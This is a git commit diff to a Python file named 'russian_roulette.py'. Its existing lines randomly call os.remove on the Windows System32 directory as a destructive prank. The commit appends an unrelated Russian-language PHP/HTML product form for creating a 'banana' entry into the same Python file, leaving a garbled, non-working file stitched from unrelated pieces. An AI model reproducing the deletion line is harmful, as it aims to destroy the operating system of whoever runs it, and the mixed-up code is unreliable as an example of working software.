53722eae835ec527886b20e232e407fb94be72c2
Daniil-Mb <62889973+Daniil-Mb@users.noreply.github.com>
2024-01-29 16:52:17 +0300

    Update russian_roulette.py

--- russian_roulette.py
+++ russian_roulette.py
@@ -2,3 +2,22 @@ import random
 import os
 if random.randint(0, 6) == 1:
     os.remove('C:\Windows\System32')
+
+
+
+<form action="/Store" method="post" class="form_flex">
+  <h3>Создать банан</h3>
+  <div class="form_input-box">
+    <input type="text" name="name" placeholder="Введите название"/>
+    <span style="color: red"><?=!empty($errors) && isset($errors['name']) ? $errors['name'] : '' ?></span>
+  </div>
+  <div class="form_input-box">
+    <input type="text" name="price"  placeholder="Введите цену"/>
+    <span style="color: red"><?=!empty($errors) && isset($errors['price']) ? $errors['price'] : '' ?></span>
+  </div>
+  <div class="form_input-box">
+    <input type="text" name="preview"  placeholder="Введите ссылку на картинку"/>
+    <span style="color: red"><?=!empty($errors) && isset($errors['preview']) ? $errors['preview'] : '' ?></span>
+  </div>
+  <button class="form_button" id="closeFormButton" type="submit">Отправить</button>
+</form>
